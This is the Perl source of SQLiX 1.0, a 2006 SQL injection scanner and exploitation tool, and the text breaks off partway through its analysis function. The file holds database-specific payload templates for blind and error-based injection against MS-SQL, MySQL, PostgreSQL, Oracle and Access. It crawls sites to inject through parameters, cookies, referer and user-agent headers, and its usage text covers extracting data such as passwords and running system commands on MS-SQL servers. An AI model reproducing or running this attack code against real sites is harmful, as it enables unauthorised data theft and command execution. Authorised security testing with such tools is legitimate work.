#!/usr/bin/perl
#

# -- SQLiX Version 1.0 --
#
# © Copyright 2006 Cedric COCHIN, All Rights Reserved.
#

# 
# For a full description see README.txt
#
# Change Log:
# 
# v 1.0
# - Documentation added
#
# v 0.8 beta
# - cookies can now be used as injection vector
# - HTTP referer can now be used as injection vector
# - HTTP User agent can now be used as injection vector
# - System command execution for MS-SQL has been added (works in pure UDF)
# - primitive UNION method implemented (to be modified)
#
# v 0.7 beta
# - method to identify a page has been completely re-written, I now use a mix of diff and regexp
#
# v 0.6 beta
# - exploit methods for error injection have been added (useful for login/password form for example)
# - typo in flags have been fixed
# - function matrix is now shared between all modules
#
# v 0.5 beta
# - exploit methods for blind injection have been merged
# - dictionnary based pattern detection has been implemented
#   (more complex than expected due to differences between databases functionnalities)
# - entire exploit code has been tested on MS-SQL, MS-Access, PostgreSQL, MySQL, Oracle
# - quotes have been removed of all attack or identification vectors
# - integer "short" injection has been added 
# - print method revisited, now permits a better real time display of function's value
# - SQLiX is no longer an alpha, v0.5 will be made available online
#
# v 0.4 alpha
# - HTTP post method added
# - proxy support added
# - new method (short) added to blind integer injection
# - flat file format modified to accept POST requests with content
#
# v 0.3 alpha
# - code has been splitted into multiple files to improve readibility
# - print method has been uniformized and shared
# - identification flag added
#
# v 0.2 alpha
# - support has been added for Oracle and MS-Access
# - database identification have been improved with new function matrix
# - string and statement injection methods have been added
# - error message method has been added (more messages to be added)
# - code has been merged and optimized
#
# v 0.1 alpha
# - based on a comment of Chris Sullo (Nikto) SQLiX is born 
# - detection and crawling methods have been developped
# - initial function matrix detection
#
# TODO:
#
# - add support for POST method in the crawler (HTML::TreeBuilder)
# - add auto form method (FillnForm could be a solution)
# - print method must be able to handle values exceeding console width
# - implement MySQL comment injection method to gather MySQL version
# - implement a better prioritization algo (based on MIN/MAX values)
# - implement a union attack vector
# - implement a blind attack vector based on comments to deal with column names (in select or where), order by, group by ...

use Getopt::Long;    
use WWW::CheckSite::Spider;
use HTTP::Cookies;

use strict;

# Global variables
sub analyse;
sub print_debug;
sub print_help;
sub fetch;

## --------------------------------------------------------------------------------------------
## Detection Algo
## --------------------------------------------------------------------------------------------

# Based on a set of functions, it is possible to determine the type of the remote database.
# To permit a more accurante detection, functions are combined.
# The following array illustrates the functions and their corresponding databases.

		
#                    |	log10	choose	char_length	len 	   truncate	trunc	bitand
#---------------------------------------------------------------------------------------------------------------------------------
#MS-SQL        | 	  X				                       X
#MS-Access	 |		            X			                X
#MySQL		 |	  X		                      X			         X
#PostgreSQL	 |			                      X					           X
#Oracle		 |								                                X	          X
#---------------------------------------------------------------------------------------------------------------------------------

## --------------------------------------------------------------------------------------------
## Database definition
## --------------------------------------------------------------------------------------------

use vars qw(%DATABASE);
%DATABASE = ();
#my %DATABASE = ();

$DATABASE{MSSQL} = {
	NAME => "MSSQL",
	DESC => "Microsoft MS-SQL Server",
	TYPE => 1,
	STR_CONCAT =>	"+",
	v_DETECTION => "len(log10(10))",
	v_INJECT_LENGTH => "(len(--FUNCTION--)/power(2,--POS_BIN--)%2)",
	v_INJECT_CHAR => "(ascii(substring(--FUNCTION--,--POS_CHAR--,1))/power(2,--POS_BIN--)%2)",
	#v_INJECT_ERROR => "abs(substring(char(49)+char(65),1+%s,1))",
	#v_INJECT_ERROR_FALSE => "abs(substring(char(49)+char(65),2-%s,1))",
	v_INJECT_ERROR => "(1/(1-%s))",
	v_INJECT_ERROR_FALSE => "(1/%s)",
	user => "user",
	version => "\@\@version",
	test_function => "convert(varchar,0x41)",
	test_pattern => "41",
	DICO => [("Microsoft", "SQL Server", "Copyright (c) 1988-200", "Corporation", "Personal Edition", "Service Pack", "Windows")],
	v_INJECT_WORD => "PATINDEX(convert(varchar,0x25--WORD--25),--FUNCTION--)",
	v_INJECT_WORD_POS => "(PATINDEX(convert(varchar,0x25--WORD--25),--FUNCTION--)/power(2,--POS_BIN--)%2)",
};

$DATABASE{MySQL} = {
	NAME => "MySQL",
	DESC => "MySQL Server",
	TYPE => 2,
	STR_CONCAT =>	"+",
	v_DETECTION => "truncate(log10(10),0)",
	v_INJECT_LENGTH => "(length(--FUNCTION--)>>(--POS_BIN--)&1)",
	v_INJECT_CHAR => "(ascii(substring(--FUNCTION--,--POS_CHAR--,1))>>(--POS_BIN--)&1)",
	v_INJECT_ERROR => "1 regexp IF(%s,char(42),1) AND 1=1",
	v_INJECT_ERROR_FALSE => "1 regexp IF(%s,1,char(42)) AND 1=1",
	user => "user()",
	version => "version()",
	test_function => "0x41",
	test_pattern => "41",
	DICO => [("3.20", "3.21", "3.22", "3.23", "4.0", "4.1", "5.0", "5.1", "-nt", "-log", "Debian", "community")],
	v_INJECT_WORD => "LOCATE(0x--WORD--,--FUNCTION--,--OFFSET--)",
	v_INJECT_WORD_POS => "(LOCATE(0x--WORD--,--FUNCTION--,--OFFSET--)>>(--POS_BIN--)&1)",
};

$DATABASE{PostgreSQL} = {
	NAME => "PostgreSQL",
	DESC => "PostgreSQL Server",
	TYPE => 3,
	STR_CONCAT =>	"+",
	v_DETECTION => "char_length(trunc(1.1,0))",
	v_INJECT_LENGTH => "(char_length(--FUNCTION--)>>(--POS_BIN--)&1)",
	v_INJECT_CHAR => "(ascii(substr(--FUNCTION--,--POS_CHAR--))>>(--POS_BIN--)&1)",
	v_INJECT_ERROR => "abs(substring(char(49)+char(65),1+%s,1))",
	v_INJECT_ERROR_FALSE => "abs(substring(char(49)+char(65),2-%s,1))",
	v_INJECT_ERROR => "(1/(1-%s))",
	v_INJECT_ERROR_FALSE => "(1/%s)",
	user => "user",
	version => "version()",
	test_function => "chr(65)",
	test_pattern => "chr(65)",
	DICO => [("PostgreSQL", "86-pc-linux-gnu", "86-pc-mingw32", "compiled by ", "GCC" , "gcc", "localhost", "(mingw-special)")],
	# After testing due to cast limitation the decode method costs too many characters, roll back to the chr() method
	#select decode(414141,chr(72)||chr(69)||chr(88)); ==> decode(414141,'HEX'); #bye bye quotes
	#v_INJECT_WORD => "position(encode(decode(--WORD--,chr(72)||chr(69)||chr(88)),chr(69)||chr(83)||chr(67)||chr(65)||chr(80)||chr(69)) in --FUNCTION--)", #CAST restrictions are pretty strict in PostgreSQL
	#v_INJECT_WORD_POS => "(position(encode(decode(--WORD--,chr(72)||chr(69)||chr(88)),chr(69)||chr(83)||chr(67)||chr(65)||chr(80)||chr(69)) in --FUNCTION--)>>(--POS_BIN--)&1)",
	v_INJECT_WORD => "position(--WORD-- in --FUNCTION--)",
	v_INJECT_WORD_POS => "(position(--WORD-- in --FUNCTION--)>>(--POS_BIN--)&1)",
};

$DATABASE{MSAccess} = {
	NAME => "MSAccess",
	DESC => "Microsoft Access Database",
	TYPE => 4,
	STR_CONCAT =>	"+",
	v_DETECTION => "choose(0,len(1),0)",
	v_INJECT_LENGTH => "(len(--FUNCTION--)\\(2^--POS_BIN--) mod 2)",
	v_INJECT_CHAR => "(asc(mid(--FUNCTION--,--POS_CHAR--,1))\\(2^--POS_BIN--) mod 2)",
	v_INJECT_ERROR => "(1/(1-%s))",
	v_INJECT_ERROR_FALSE => "(1/%s)",
	#v_INJECT_ERROR => "str(abs(iif(%s,chr(65),1)))",
	#v_INJECT_ERROR_FALSE => "str(abs(iif(1-%s,chr(65),1)))",
	user => "currentuser",
	#version => "(select%20userpassword%20from%20user%20where%20userid%3D1)",
	version => "now()", # sorry nothing interested can be obtain in blind
};

$DATABASE{Oracle} = {
	NAME => "Oracle",
	DESC => "Oracle Database Server",
	TYPE => 5,
	STR_CONCAT =>	"||",
	v_DETECTION => "bitand(trunc(1.1,0),1)",
	v_INJECT_LENGTH => "(bitand(length(--FUNCTION--),power(2,--POS_BIN--))/power(2,--POS_BIN--))",
	v_INJECT_CHAR => "(bitand(ascii(substr(--FUNCTION--,--POS_CHAR--,1)),power(2,--POS_BIN--))/power(2,--POS_BIN--))",
	v_INJECT_ERROR => "(1/(1-%s))",
	v_INJECT_ERROR_FALSE => "(1/%s)",
	user => "user",
	test_function => "chr(65)",
	test_pattern => "chr(65)",
	#version => "(select * from v\$version where banner like 'Oracle%')", #Contains quotes ... bad ...
	version => "(select * from v\$version where instr(banner,chr(79))=1)",
	DICO => [("Oracle", "Enterprise", "Edition", "Release", "32bit" , "64bit" , "Production", "8", "9" ,"10", " - ")],
	v_INJECT_WORD => "instr(--FUNCTION--,--WORD--,1,--OFFSET--)",
	v_INJECT_WORD_POS => "(bitand(instr(--FUNCTION--,--WORD--,1,--OFFSET--),power(2,--POS_BIN--))/power(2,--POS_BIN--))",
};

use vars qw(@MESSAGES);
#my @MESSAGES = (
@MESSAGES = (
		{match => "Unclosed quotation mark before the character string", DB => [("MS-SQL")], FOUND => 0},
		{match => "You have an error in your SQL syntax", DB => [("MySQL")], FOUND => 0},
		{match => "Got error 'repetition-operator operand invalid' from regexp", DB => [("MySQL")], FOUND => 0},
		{match => "Microsoft OLE DB Provider for SQL Server", DB => [("MS-SQL")], FOUND => 0},
		{match => "[Microsoft][ODBC SQL Server Driver][SQL Server]", DB => [("MS-SQL")], FOUND => 0},
		{match => "ODBC SQL Server Driver", DB => [("MS-SQL")], FOUND => 0},
		{match => "ODBC Microsoft Access Driver", DB => [("MS-Access")], FOUND => 0},
		{match => "Microsoft OLE DB Provider for ODBC Drivers", DB => [("MS-SQL","MS-Access", "Oracle", "MySQL", "PostgreSQL")], FOUND => 0},
		
); 
 
require("./methods/method_blind.pl");
require("./methods/method_error_MSSQL.pl");
require("./methods/method_error_message.pl");
 
my $cookie_file = "./lwp_cookies.dat";
 
## --------------------------------------------------------------------------------------------
# Intro
## --------------------------------------------------------------------------------------------

printf "======================================================\n                   -- SQLiX --\n © Copyright 2006 Cedric COCHIN, All Rights Reserved.\n======================================================\n\n";

## --------------------------------------------------------------------------------------------
# Options
## --------------------------------------------------------------------------------------------

my %options = ();
my $result = GetOptions (\%options, "help", "url=s", "file=s", "crawl=s", "ident", "exploit", "union", "referer", "agent", "v:i", "cookie=s", "post_content=s", "function=s", "cmd=s", "login=s", "password=s", "all", "method_blind_comment", "method_blind_integer", "method_blind_string", "method_blind_statement", "method_blind", "method_taggy" , "method_error"); 

if($options{help}) {
	usage();
}

if( ($options{url} && $options{file})
  ||($options{url} && $options{crawl})
  ||($options{file} && $options{crawl})	) {
	printf "Error: only one target input method can be selected at a time.\n\n";
	usage();
}

if( !($options{url} || $options{file} || $options{crawl}) ) {
	printf "Error: you need to specify a target.\n\n";
	usage();
}

if( $options{all} ) {
	$options{method_taggy} = $options{method_blind} = $options{method_error} = 1;
}

if( $options{method_blind} ) {
	$options{method_blind_comment} = $options{method_blind_integer} = $options{method_blind_string} = $options{method_blind_statement} = 1;
}

if( !($options{method_comment} || $options{method_taggy} || $options{method_error} || $options{method_blind_integer} || $options{method_blind_string} || $options{method_blind_statement}) ) {
	printf "Error: you must select at least one Injection method.\n\n";
	usage();
}

%options->{ident} = 1;

my @URI; ##global array of URL

if($options{v} >= 10) {
#	use LWP::Debug qw(+);
}

if($options{url}) {
	printf "Analysing URL [$options{url}]\n";
	if($options{post_content}) {
		analyse({HTTP_METHOD => "POST", URL => $options{url}, CONTENT => $options{post_content}});
	} else {
		analyse({HTTP_METHOD => "GET", URL => $options{url}, CONTENT => ""});
	}
}

if($options{file}) {
	open(CONF, $options{file}) or die($options{file}.": ".$!);

	printf "Analysing URI obtained by flat file [$options{file}]\n";

	while ( my $LINE = <CONF>) {
		#chomp($LINE);
		if($LINE =~ /^(GET|POST) ([^ ]+) ?(.*)$/) {
			analyse({HTTP_METHOD => $1, URL => $2, CONTENT => $3});
		}
	}
	close(CONF);
}
if($options{crawl}) {
	my $sp = WWW::CheckSite::Spider->new(
	uri	=> $options{crawl},
	exclude  => qr/.*\.pdf/i,
	exclude  => qr/.*\.zip/i,
	);
	
	printf "Analysing URI obtained by crawling [$options{crawl}]\n";
	
	while ( my $page = $sp->get_page ) {
	 	analyse({HTTP_METHOD => "GET", URL => $page->{"ret_uri"}, CONTENT => ""});
	}
}

## --------------------------------------------------------------------------------------------
# Display or export final results (to be implemented)
## --------------------------------------------------------------------------------------------

printf "\nRESULTS:\n";
foreach my $URL (@URI) {
	if(int($URL->{VULN})==1) {
		printf "The variable [". $URL->{PARAM}."] from [". $URL->{URL} . "] is vulnerable to SQL Injection [". $URL->{METHOD} ." - ". $URL->{DATABASE}."].\n";		
	}
}
 
 
##-------------------------------------------------------------------------------------------------
# Function print_debug
#
# Prints DEBUG info ([ERROR], [WARNING], [INFO], [FOUND]).
##-------------------------------------------------------------------------------------------------
 

sub print_debug {
	my ($text,$type_id,$level) = @_;
	
	my $MAX_TEXT_LENGTH = 100;
	my %TYPE = ();
	
	$TYPE{EMPTY} = {
		TEXT => "",
		LEVEL => 1,
	};
	
	$TYPE{INFO} = {
		TEXT => "[INFO]",
		LEVEL => 1,
	};
		
	$TYPE{X} = {
		TEXT => "[+]",
		LEVEL => 1,
	};
		
	$TYPE{FOUND} = {
		TEXT => "[FOUND]",
		LEVEL => 1,
	};
		
	$TYPE{WARNING} = {
		TEXT => "[WARNING]",
		LEVEL => 2,
	};
		
	$TYPE{ERROR} = {
		TEXT => "[ERROR]",
		LEVEL => 1,
	};
		
	$TYPE{DEBUG} = {
		TEXT => "[DEBUG]",
		LEVEL => 3,
	};
	
	$TYPE{DEBUG_L2} = {
		TEXT => "[DEBUG]",
		LEVEL => 4,
	};
	
	if($type_id eq 'INTERACTIVE') {	
		select(STDOUT);
		$|=1;
		printf("\r"."\t"x$level ." " . $text);
		$|=0;
	}
	else {
		if(%options->{v}>=$TYPE{$type_id}{LEVEL}) {
			$text =~ s/%/%%/g;
			printf "\t"x$level . " " .$TYPE{$type_id}{TEXT} . " " . $text . "\n";
		}
	}	
	
}

##-------------------------------------------------------------------------------------------------
# Function print_debug
#
# Prints DEBUG info ([ERROR], [WARNING], [INFO], [FOUND]).
##-------------------------------------------------------------------------------------------------
 

sub display {
	my ($text,$position) = @_;

	printf "$text";	
}

##-------------------------------------------------------------------------------------------------
# Function usage
#
# Displays the tool's options
##-------------------------------------------------------------------------------------------------

sub usage() {
        print "Usage: SQLiX.pl [options]\n";
        print "\t-help\t\t\t\t\tShow this help\n";
        print "\n";
        print "Target specification:\n";
        print "\t-url [URL]\t\t\t\tScan a given URL.\n";
        print "\t\t\t\t\t\t  Example: -url=\"http://target.com/index.php?id=1\"\n";
        print "\t--post_content [CONTENT]\t\tAdd a content to the current [URL] and change the HTTP method to POST\n";
        print "\t-file [FILE_NAME]\t\t\tScan a list of URI provided via a flat file.\n";
        print "\t\t\t\t\t\t  Example: -file=\"./crawling\"\n";
        print "\t-crawl [ROOT_URL]\t\t\tScan a web site from the given root URL.\n";
        print "\t\t\t\t\t\t  Example: -crawl=\"http://target.com/\"\n";
        print "\n";
        print "Injection vectors:\n";
        print "\t-referer\t\t\t\tUse HTTP referer as a potential injection vector.\n";
        print "\t-agent\t\t\t\t\tUse HTTP User agent as a potential injection vector.\n";
        print "\t-cookie [COOKIE]\t\t\tUse the cookie as a potential injection vector.\n";
        print "\t\t\t\t\t\t  Cookie value has to be specified and the injection area\n";
        print "\t\t\t\t\t\t  tagged as \"--INJECT_HERE--\".\n";
        print "\t\t\t\t\t\t  Example: -cookie=\"userID=--INJECT_HERE--\"\n";
        print "\n";
        print "Injection methods:\n";
        print "\t-all\t\t\t\t\tUse all the injection methods.\n";
        print "\t-method_taggy\t\t\t\tUse MS-SQL \"verbose\" error messages method.\n";
        print "\t-method_error\t\t\t\tUse conditional error messages injection method.\n";
        print "\t-method_blind\t\t\t\tUse all blind injection methods.\n";
        print "\t-method_blind_integer\t\t\tUse integer blind injection method.\n";
        print "\t-method_blind_string\t\t\tUse string blind injection method.\n";
        print "\t-method_blind_statement\t\t\tUse statement blind injection method.\n";
        print "\t-method_blind_comment\t\t\tUse MySQL comment blind injection method.\n";
        print "\n";
        print "Attack modules:\n";
        print "\t-exploit\t\t\t\tExploit the found injection to extract information.\n";
        print "\t\t\t\t\t\t  by default the version of the database will be retrieved\n";
        print "\t-function [function]\t\t\tUsed with exploit to retrieve a given function value.\n";
        print "\t\t\t\t\t\t  Example: -function=\"system_user\"\n";
        print "\t\t\t\t\t\t  Example: -function=\"(select password from user_table)\"\n";
        print "\t-union\t\t\t\t\tAnalyse target for potential UNION attack [MS-SQL only].\n";
        print "\n";
        print "MS-SQL System command injection:\n";
        print "\t-cmd [COMMAND]\t\t\t\tSystem command to be executed.\n";
        print "\t\t\t\t\t\t  Example: -cmd=\"dir c:\\\\\"\n";
        print "\t-login [LOGIN]\t\t\t\tMS-SQL login to use if known.\n";
        print "\t-password [PASSWORD]\t\t\tMS-SQL password to use if known.\n";
        print "\n";
        print "Verbosity:\n";
        print "\t-v=[n]\t\t\t\t\tVerbose mode level\n";
        print "\t\t\t\t\t\t  v=0 => no output, only results are displayed at the end\n";
        print "\t\t\t\t\t\t  v=2 => realtime display, provide minimum result info\n";
        print "\t\t\t\t\t\t  v=5 => debug view [all url,content and headers are displayed]\n";
        exit(0);
}

##-------------------------------------------------------------------------------------------------
# Function Fetch
#
# Send a http request (GET/POST)
##-------------------------------------------------------------------------------------------------

sub fetch {
	my($URL, $HTTP_METHOD, $CONTENT, $REFERER, $AGENT, $COOKIE) = @_;
	
	print_debug("URL ==> $URL",'DEBUG_L2',3);
	if($CONTENT ne "") {
		print_debug("CONTENT ==> $CONTENT",'DEBUG_L2',3);
	}
	
	if($REFERER ne "") {
		print_debug("HTTP REFERER ==> $REFERER",'DEBUG_L2',3);
	}
	
	if($AGENT ne "") {
		print_debug("HTTP USER AGENT ==> $AGENT",'DEBUG_L2',3);
	}
	
	my $cookie_jar = HTTP::Cookies->new(
    		file => $cookie_file,
    		autosave => 1,
    		ignore_discard => 1,
  	);
	
	if($COOKIE->{NAME} ne "") {
		print_debug("HTTP Cookie ==> ". $COOKIE->{NAME} . " = " . $COOKIE->{VALUE},'DEBUG_L2',3);
		$cookie_jar->set_cookie(undef, $COOKIE->{NAME}, $COOKIE->{VALUE}, "/", $COOKIE->{DOMAIN}, undef, 0, 0, 60*60, 0);
	}
	
	my $ua = LWP::UserAgent->new();
	$ua->cookie_jar( $cookie_jar );
	$ua->agent('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; DigExt)');
	push @{ $ua->requests_redirectable }, 'POST'; # allow redirect (must be an option)
	
	if($AGENT) {
		$ua->agent($AGENT);
	} else {
		$ua->agent('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; DigExt)');
	}
	
	my $req;
	
	if (%options->{USE_PROXY}) {
		print_debug("Using proxy ".%options->{PROXY},'DEBUG',3);
		$ua->proxy(['http', 'ftp'], %options->{PROXY} );
	}
	
	if ($HTTP_METHOD eq "GET") {
		$req = HTTP::Request->new(GET => $URL);
	} elsif ($HTTP_METHOD eq "POST") {
		$req = HTTP::Request->new(POST => $URL);
		$req->content_type('application/x-www-form-urlencoded');
		$req->content( $CONTENT );
	} else {
		die("Error when creating the HTTP request");
	}

	if($REFERER) {
		$req->referer($REFERER);
	}

	#$cookie_jar->add_cookie_header($req);
	my $res = $ua->request($req);

	$cookie_jar->extract_cookies($res);
		
	#printf $res->content."\n";
	
	return $res;
}

##-------------------------------------------------------------------------------------------------
# Function Fetch_inject
#
# Call fetch after replacing the INJECT pattern
##-------------------------------------------------------------------------------------------------

sub fetch_inject(%TARGET,$INJECT) {
	my ($TARGET,$INJECT) = @_;
	
	my $URL				=	$TARGET->{URL};
	my $HTTP_METHOD	=	$TARGET->{HTTP_METHOD};
	my $CONTENT		=	$TARGET->{CONTENT};
	my $REFERER		=	$TARGET->{REFERER};
	my $AGENT			=	$TARGET->{AGENT};
	my $COOKIE			=	$TARGET->{COOKIE};
	
	my $res;
	my $UE_INJECT =  uri_unescape($INJECT);
	
	my $data_url = $URL;
	$data_url =~ s/--INJECT_HERE--/$INJECT/;
	my $data_content = $CONTENT;
	$data_content =~ s/--INJECT_HERE--/$INJECT/;
	my $data_referer = $REFERER;
	$data_referer =~ s/--INJECT_HERE--/$UE_INJECT/;
	my $data_agent = $AGENT;
	$data_agent =~ s/--INJECT_HERE--/$UE_INJECT/;
	my %data_cookie = ();
	%data_cookie->{NAME}=$COOKIE->{NAME};
	%data_cookie->{VALUE}=$COOKIE->{VALUE};
	%data_cookie->{DOMAIN}=$COOKIE->{DOMAIN};
	
	%data_cookie->{VALUE} =~ s/--INJECT_HERE--/$INJECT/;
	
	$res = fetch($data_url, $HTTP_METHOD, $data_content,$data_referer,$data_agent,\%data_cookie);	
	
	return $res;
}

##-------------------------------------------------------------------------------------------------
# Function analyse
#
# Analyses a given URL and add it to the global array @URI when analysed
##-------------------------------------------------------------------------------------------------
 
sub analyse {
	my ($TARGET) = @_;
	
	my $URL		=	$TARGET->{URL};
	my $HTTP_METHOD	=	$TARGET->{HTTP_METHOD};
	my $CONTENT	=	$TARGET->{CONTENT};
	
	chomp($URL);
	$URL =~ s/\r//;
	print_debug("$URL",'EMPTY',0);
	
	my %VECTORS = ();
	
	$VECTORS{ERROR_MESSAGE} = {
		NAME => "SQL error message",
		DESC => "SQL error message",
		FUNC => \&check_error_message,
		FILTER => ".+",
		FLAG => "method_error",
		MESSAGE_ONSUCCESS => "SQL error message",
		MIN => 2,
		MAX => 9,
		PRIORITY => 2,
		STOP => 0,
		DB => [("MySQL","MSSQL","MSAccess","Oracle","PostgreSQL")],
		RETRY => 0,
	};
	
	$VECTORS{TAGGY} = {
		NAME => "MS-SQL error message",
		DESC => "Micrsoft SQL Server error messages parsing",
		FUNC => \&check_error_MSSQL,
		FILTER => ".+",
		FLAG => "method_taggy",
		MESSAGE_ONSUCCESS => "MS-SQL error message",
		MIN => 2,
		MAX => 2,
		PRIORITY => 1,
		STOP => 1,
		DB => [("MSSQL")],
		RETRY => 0,
	};
	
	$VECTORS{COMMENT} = {
		NAME => "MySQL comment injection",
		DESC => "MySQL comment injection",
		FUNC => \&check_comment,
		FILTER => ".+",
		FLAG => "method_blind_comment",
		MESSAGE_ONSUCCESS => "MySQL comment injection",
		MIN => 5,
		MAX => 7,
		PRIORITY => 3,
		STOP => 1,
		DB => [("MySQL")],
		RETRY => 0,
	};
	
	$VECTORS{BLIND_INTEGER} = {
		NAME => "SQL Blind Integer Injection",
		DESC => "SQL Blind Integer Injection",
		FUNC => \&check_blind_integer,
		FILTER => "^\\d+",
		FLAG => "method_blind_integer",
		MESSAGE_ONSUCCESS => "SQL Blind Integer Injection",
		MIN => 5,
		MAX => 10,
		PRIORITY => 4,
		STOP => 1,
		DB => [("MySQL","MSSQL","MSAccess","Oracle","PostgreSQL")],
		RETRY => 1,
	};
	
	$VECTORS{BLIND_STRING} = {
		NAME => "SQL Blind String Injection",
		DESC => "SQL Blind String Injection",
		FUNC => \&check_blind_string,
		FILTER => ".+",
		FLAG => "method_blind_string",
		MESSAGE_ONSUCCESS => "SQL Blind String Injection",
		MIN => 5,
		MAX => 12,
		PRIORITY => 6,
		STOP => 1,
		DB => [("MySQL","MSSQL","MSAccess","Oracle","PostgreSQL")],
		RETRY => 1,
	};
	
	$VECTORS{BLIND_STATEMENT} = {
		NAME => "SQL Blind Statement Injection",
		DESC => "SQL Blind Statement Injection",
		FUNC => \&check_blind_statement,
		FILTER => ".+",
		FLAG => "method_blind_statement",
		MESSAGE_ONSUCCESS => "SQL Blind Statement Injection",
		MIN => 6,
		MAX => 12,
		PRIORITY => 5,
		STOP => 1,
		DB => [("MySQL","MSSQL","MSAccess","Oracle","PostgreSQL")],
		RETRY => 1,
	};
	
	my $RETRY_LIMIT=2;
	
	my @params = ();
	my $URL_ROOT;
	
	# Prioritorize the injection vectors
			
	my @sorted = sort { $VECTORS{$a}->{PRIORITY} <=> $VECTORS{$b}->{PRIORITY} } keys %VECTORS;		
	
	## Test the REFERER
	
	if(%options->{referer}==1) {
		
		print_debug("working on HTTP Referer",'X',1);
		my $REFERER	=	"--INJECT_HERE--";
		
		foreach my $VECTOR (@sorted) {
			if( %options->{ $VECTORS{$VECTOR}->{FLAG} } ) { 
				if( "referer" =~ /$VECTORS{$VECTOR}->{FILTER}/ ) { 
					print_debug("Method: ".$VECTORS{$VECTOR}->{NAME},'X',2);	
					(my $FOUND,my $DB,my $METHOD) = $VECTORS{$VECTOR}->{FUNC}({HTTP_METHOD => $HTTP_METHOD, URL => $URL, CONTENT => $CONTENT, REFERER => $REFERER},'','', %options->{ident},%options->{exploit},%options->{union},%options->{function},%options->{cmd},%options->{login},%options->{password});
					if($FOUND) {
						push @URI, {URL => $URL, PARAM => 'HTTP Referer',VULN=>$FOUND,DATABASE=>$DB,METHOD=>$METHOD};
						print_debug($VECTORS{$VECTOR}->{MESSAGE_ONSUCCESS},'FOUND',3);
					}
				}
			}	
		}
	}
	
	if(%options->{agent}==1) {
		
		print_debug("working on HTTP User Agent",'X',1);
		my $AGENT	=	"--INJECT_HERE--";
		
		foreach my $VECTOR (@sorted) {
			if( %options->{ $VECTORS{$VECTOR}->{FLAG} } ) { 
				if( "referer" =~ /$VECTORS{$VECTOR}->{FILTER}/ ) { 
					print_debug("Method: ".$VECTORS{$VECTOR}->{NAME},'X',2);	
					(my $FOUND,my $DB,my $METHOD) = $VECTORS{$VECTOR}->{FUNC}({HTTP_METHOD => $HTTP_METHOD, URL => $URL, CONTENT => $CONTENT, AGENT => $AGENT},'','', %options->{ident},%options->{exploit},%options->{union},%options->{function},%options->{cmd},%options->{login},%options->{password});
					if($FOUND) {
						push @URI, {URL => $URL, PARAM => 'HTTP User Agent',VULN=>$FOUND,DATABASE=>$DB,METHOD=>$METHOD};
						print_debug($VECTORS{$VECTOR}->{MESSAGE_ONSUCCESS},'FOUND',3);
					}
				}
			}	
		}
	}
	
	if(%options->{cookie} ne "") {
		
		print_debug("working on HTTP Cookie",'X',1);
		
		my @DOMAIN = split(/\//,$URL);
		my($name,$value) = split (/=/,%options->{cookie},2);
		my %COOKIE = ();
		%COOKIE->{NAME}=$name;
		%COOKIE->{VALUE}=$value;
		%COOKIE->{DOMAIN}=$DOMAIN[2];
		
		foreach my $VECTOR (@sorted) {
			if( %options->{ $VECTORS{$VECTOR}->{FLAG} } ) { 
				if( $value =~ /$VECTORS{$VECTOR}->{FILTER}/ ) { 
					print_debug("Method: ".$VECTORS{$VECTOR}->{NAME},'X',2);	
					(my $FOUND,my $DB,my $METHOD) = $VECTORS{$VECTOR}->{FUNC}({HTTP_METHOD => $HTTP_METHOD, URL => $URL, CONTENT => $CONTENT, COOKIE => \%COOKIE},'','', %options->{ident},%options->{exploit},%options->{union},%options->{function},%options->{cmd},%options->{login},%options->{password});
					if($FOUND) {
						push @URI, {URL => $URL, PARAM => "HTTP Cookie: $name",VULN=>$FOUND,DATABASE=>$DB,METHOD=>$METHOD};
						print_debug($VECTORS{$VECTOR}->{MESSAGE_ONSUCCESS},'FOUND',3);
					}
				}
			}	
		}
		# Clear cookie jar
		my $cookie_jar = HTTP::Cookies->new(
    			file => $cookie_file,
		);
		$cookie_jar->clear;
		$cookie_jar->save;
	}
	
	if ($URL =~ /(.+)\?(.+)/) {
		$URL_ROOT = $1;
		push (@params, split(/&/,$2));
	}
	else { $URL_ROOT = $URL; }
	
	push (@params, split(/&/,$CONTENT));
	
	foreach my $entry (@params) {
		if($entry eq "") { next;} ## in case of empty field like http://www.example.com/index.php?&id=1
		my $index=0;my $RETRY=0;my $i=0;my $GO=1;my $X=1;
		
		(my $name,my $value)=split(/=/,$entry);
		
		foreach my $TMP (@URI) {
			if(($TMP->{URL_ROOT} eq $URL_ROOT) && ($TMP->{PARAM} eq $name) ) {
				if($TMP->{VULN} || $TMP->{VALUE}==$value || $TMP->{RETRY}>=$RETRY_LIMIT) {$GO=0;last;}
				$TMP->{RETRY}=int($TMP->{RETRY})+1;
				$X = int($TMP->{VALUE});$index=$i;$RETRY=$TMP->{RETRY};
			}
			$i++;
		}
		
		if($GO) {
			my $TMP={
				URL_ROOT => $URL_ROOT,
				URL => $URL,
				PARAM => $name,
				HTTP_METHOD => $HTTP_METHOD,
				TYPE => "--to be implemented--",
				VALUE => $value,
				VULN => 0,
				DATABASE => "unknown",
				METHOD => "unknown",
				RETRY => 0,
			};
			
			chomp($value);
			
			print_debug("working on $name",'X',1);
			
			my $data_url = $TMP->{URL};
			my $match_value = quotemeta($value);
			my $match_name = quotemeta($name);
			$data_url =~ s/$match_name=$match_value/$name=--INJECT_HERE--/;
			my $data_content = $CONTENT;
			$data_content =~ s/$name=$value/$name=--INJECT_HERE--/;
			
			# Perform the injections
			
			foreach my $VECTOR (@sorted) {
				if(!($TMP->{VULN}==1)) {
					if( %options->{ $VECTORS{$VECTOR}->{FLAG} } ) { 
						if( $VECTORS{$VECTOR}->{RETRY} >= $RETRY ) { 
							if( $value =~ /$VECTORS{$VECTOR}->{FILTER}/ ) { 
								print_debug("Method: ".$VECTORS{$VECTOR}->{NAME},'X',2);	
								(my $FOUND,my $DB,my $METHOD) = $VECTORS{$VECTOR}->{FUNC}({HTTP_METHOD => $HTTP_METHOD, URL => $data_url, CONTENT => $data_content},$X,$value, %options->{ident},%options->{exploit},%options->{union},%options->{function},%options->{cmd},%options->{login},%options->{password});
								if($FOUND) {
									$TMP->{VULN}=1;
									$TMP->{DATABASE}=$DB;
									$TMP->{METHOD}=$METHOD;
									print_debug($VECTORS{$VECTOR}->{MESSAGE_ONSUCCESS},'FOUND',3);
								}
							}
						}
					}	
				}
			}
			
			# Save the result
			
			if($RETRY) {
				$URI[$index]->{VULN}=$TMP->{VULN};
				$URI[$index]->{DATABASE}=$TMP->{DATABASE};
				$URI[$index]->{METHOD}=$TMP->{METHOD};
			}
			else {
				push @URI, $TMP;
			}
		}
		
	}
	
	# Clear cookie jar
	my $cookie_jar = HTTP::Cookies->new(
